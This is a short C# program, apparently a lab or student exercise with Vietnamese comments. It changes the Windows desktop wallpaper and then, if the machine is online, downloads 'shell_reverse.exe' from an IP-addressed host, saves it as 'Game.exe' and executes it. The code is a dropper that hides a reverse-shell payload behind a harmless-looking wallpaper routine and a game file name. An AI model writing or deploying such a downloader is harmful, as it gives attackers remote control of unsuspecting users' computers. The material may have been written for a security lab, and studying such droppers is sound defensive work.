using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
namespace Bai_3__2_
{
    class Program
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
        UInt32 action,//Thông số này đại diện cho hành động của hàm.
        UInt32 uParam,//Thông số này đại diện cho kích thước dữ liệu
        String vParam,//Chứa dữ liệu để hệ thống sử dụng
        UInt32 winIni//Thông số này đại diện cho việc có muốn áp dụng thay đổi ngay lập tức hay không
        );

        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        static public void SetWallpaper(String path)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 0.ToString()); // 2 is stretched
            key.SetValue(@"TileWallpaper", 0.ToString());

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        public static bool CheckInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        public static void ExecReverse()
        {
            using (var client = new WebClient())
            {
                client.DownloadFile("http://192.168.111.138/shell_reverse.exe", "Game.exe");
                Process.Start(System.IO.Directory.GetCurrentDirectory() + "Game.exe");
            }
        }



        static void Main(string[] args)
        {
            string imgWallpaper = @"E:\53f71d3febb7955800f9928356204efc.jpg";

            // verify    
            if (File.Exists(imgWallpaper))
            {
                SetWallpaper(imgWallpaper);
            }

            if (CheckInternetConnection()) ExecReverse();
            else
            {
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
                System.IO.Directory.CreateDirectory(desktopPath + "\\test");
            }

        }
    }
}
